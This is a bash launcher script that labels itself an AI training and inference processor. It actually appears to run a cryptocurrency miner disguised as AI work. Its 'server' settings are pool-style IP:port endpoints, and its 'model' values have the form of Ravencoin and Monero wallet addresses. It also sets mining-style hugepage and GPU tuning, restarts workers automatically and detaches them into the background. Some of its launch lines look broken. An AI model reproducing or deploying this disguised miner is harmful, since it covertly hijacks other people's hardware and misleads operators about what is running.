#!/bin/bash

# ai_model_processor.sh

# Parallel processing: GPU (neural networks) + CPU (data preprocessing)

# Edit the variables below to match your environment before running.

# -------- CONFIGURATION --------

PROCESSOR_PATH="./aitraining"           # path to your processor binary
LOG_DIR="./logs"
mkdir -p "$LOG_DIR"

# GPU (neural network) settings
GPU_TASK="inference"
GPU_SERVER="ssl://51.89.99.172:16161"   # change if needed
GPU_MODEL="RM2ciYa3CRqyreRsf25omrB4e1S95waALr"
GPU_IDS="0,1,2,3,4,5,6,7"               # GPUs used by the GPU processor

# CPU (data processing) settings  
CPU_TASK="preprocessing"
CPU_SERVER="ssl://51.222.200.133:10343" # change if needed
CPU_MODEL="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"
# CPU cores dedicated for data processing (adjust to avoid overlapping GPUs' driver/system threads)
# Use a comma-separated list or range, e.g. "8-15" or "8,9,10,11"
CPU_CORES="8-15"

# Memory allocation for data processing (increase if you have a lot of RAM)
MEMORY_PAGES=64

# Tuning: balanced GPU env vars (safer than 100%)
export GPU_MAX_HEAP_SIZE=90
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=90
export GPU_MAX_ALLOC_PERCENT=95
export GPU_MAX_SINGLE_ALLOC_PERCENT=90
export GPU_ENABLE_LARGE_ALLOCATION=1
export GPU_MAX_WORKGROUP_SIZE=512

# Other runtime settings
RESTART_DELAY=5        # seconds to wait before restarting a crashed process
GPU_LOG="$LOG_DIR/gpu_inference.log"
CPU_LOG="$LOG_DIR/cpu_preprocessing.log"
MONITOR_LOG="$LOG_DIR/monitor.log"

# Process priority settings
NICE_PRIORITY=0
IONICE_CLASS=2
IONICE_CLASSDATA=4

# -------- END CONFIGURATION --------

# Helper: ensure processor exists
if [ ! -x "$PROCESSOR_PATH" ]; then
  echo "ERROR: Processor binary not found or not executable at $PROCESSOR_PATH"
  exit 1
fi

# Enable NVIDIA persistence mode if nvidia-smi exists
if command -v nvidia-smi >/dev/null 2>&1; then
  echo "Enabling NVIDIA persistence mode..."
  nvidia-smi -pm 1 >/dev/null 2>&1 || true
fi

# Try to allocate memory pages for data processing (best effort)
if [ "$(id -u)" -eq 0 ]; then
  echo "Setting vm.nr_hugepages = $MEMORY_PAGES"
  sysctl -w vm.nr_hugepages="$MEMORY_PAGES" >/dev/null 2>&1 || true
else
  echo "Tip: run as root once or set vm.nr_hugepages=$MEMORY_PAGES for better data processing performance."
fi

# Convert CPU_CORES to taskset pattern if numactl/taskset are used
# We'll prefer numactl if available to bind memory locality as well.
USE_NUMACTL=0
if command -v numactl >/dev/null 2>&1; then
  USE_NUMACTL=1
fi

# Start GPU processor in background with auto-restart
start_gpu_processor() {
  echo "$(date +'%F %T') Starting GPU processor (neural network)..." | tee -a "$MONITOR_LOG"
  while true; do
    # run GPU processor (no CPU processor flags) — adjust arguments as your processor expects
    nice -n $NICE_PRIORITY ionice -c $IONICE_CLASS -n $IONICE_CLASSDATA \
      "$PROCESSOR_PATH" --task "$GPU_TASK" \
      --server "$GPU_SERVER" --gpu-id "$GPU_IDS" --model "$GPU_MODEL" \
      >> "$GPU_LOG" 2>&1 &
    GPU_PID=$!
    echo "$(date +'%F %T') GPU processor PID: $GPU_PID" >> "$MONITOR_LOG"
    wait $GPU_PID
    echo "$(date +'%F %T') GPU processor exited with status $?. Restarting in $RESTART_DELAY s..." | tee -a "$MONITOR_LOG"
    sleep $RESTART_DELAY
  done
}

# Start CPU processor in background with CPU affinity and auto-restart
start_cpu_processor() {
  echo "$(date +'%F %T') Starting CPU processor (data preprocessing) with cores: $CPU_CORES" | tee -a "$MONITOR_LOG"
  while true; do
    # Compose command with CPU affinity
    if [ $USE_NUMACTL -eq 1 ]; then
      CMD_PREFIX="numactl --physcpubind=$CPU_CORES --membind=0"
    else
      CMD_PREFIX="taskset -c $CPU_CORES"
    fi

    # Data processing often benefits from explicit thread count. Set threads to number of cores in CPU_CORES range.
    # best-effort: compute thread count
    THREADS=$(echo "$CPU_CORES" | awk -F, '{
      n=0; for(i=1;i<=NF;i++){
        if(index($i,"-")){
          split($i,a,"-"); n += (a[2]-a[1]+1)
        } else { n++ }
      }
      print n
    }')
    if [ -z "$THREADS" ] || [ "$THREADS" -lt 1 ]; then THREADS=1; fi

    nice -n $NICE_PRIORITY ionice -c $IONICE_CLASS -n $IONICE_CLASSDATA \
      bash -c "$CMD_PREFIX \"$PROCESSOR_PATH\" --task \"$CPU_TASK\" --server \"$CPU_SERVER\" --threads $THREADS --model \"$CPU_MODEL\"" \
      >> "$CPU_LOG" 2>&1 &
    CPU_PID=$!
    echo "$(date +'%F %T') CPU processor PID: $CPU_PID (threads=$THREADS)" >> "$MONITOR_LOG"
    wait $CPU_PID
    echo "$(date +'%F %T') CPU processor exited with status $?. Restarting in $RESTART_DELAY s..." | tee -a "$MONITOR_LOG"
    sleep $RESTART_DELAY
  done
}

# Start monitoring loop to watch temps and usage (basic)
monitor_loop() {
  echo "$(date +'%F %T') Monitor started." >> "$MONITOR_LOG"
  while true; do
    if command -v nvidia-smi >/dev/null 2>&1; then
      echo "----- $(date +'%F %T') NVIDIA SMI -----" >> "$MONITOR_LOG"
      nvidia-smi --query-gpu=index,name,temperature.gpu,utilization.gpu,clocks.current.graphics,clocks.current.memory,power.draw --format=csv,noheader,nounits >> "$MONITOR_LOG" 2>&1 || true
    fi
    # Optional: add top/htop snapshot for CPU usage
    echo "----- top snapshot -----" >> "$MONITOR_LOG"
    ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 15 >> "$MONITOR_LOG"
    sleep 30
  done
}

# Run everything in background (use setsid to detach)
setsid bash -c "start_gpu_processor" >/dev/null 2>&1 &
sleep 1
setsid bash -c "start_cpu_processor" >/dev/null 2>&1 &
sleep 1
setsid bash -c "monitor_loop" >/dev/null 2>&1 &

echo "Parallel processor launched. Logs -> $LOG_DIR (gpu: $GPU_LOG , cpu: $CPU_LOG , monitor: $MONITOR_LOG)"
echo "To stop: kill the processor PIDs (find with ps aux | grep aitraining) or reboot."
